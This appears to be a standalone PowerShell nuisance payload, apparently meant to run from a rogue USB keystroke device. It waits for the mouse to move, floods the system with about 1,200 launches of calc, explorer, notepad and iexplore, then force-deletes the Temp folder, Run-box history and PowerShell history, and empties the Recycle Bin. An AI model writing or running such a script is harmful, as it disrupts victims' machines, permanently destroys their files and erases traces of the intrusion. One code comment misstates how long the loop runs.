# Import the System.Windows.Forms assembly
Add-Type -AssemblyName System.Windows.Forms

# Store the original position of the cursor
$originalPOS = [System.Windows.Forms.Cursor]::Position

# Loop until the cursor position changes
while (1) {
    # Check if the cursor position has changed
    if ([Windows.Forms.Cursor]::Position -ne $originalPOS) {
        # If the cursor has moved, exit the loop
        break
    }
}

# At this point, the script will continue executing


# Declare an array of applications to open
$apps = @("calc.exe", "explorer.exe", "notepad.exe", "iexplore.exe")

# Start a loop that will repeat for 30 seconds
for ($i=0; $i -lt 300; $i++) 
{
    # Loop through the array and open each application every 0.05 seconds
    foreach ($app in $apps)
    {
        Start-Process $app
        Start-Sleep -Seconds 0.05
    }
}

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue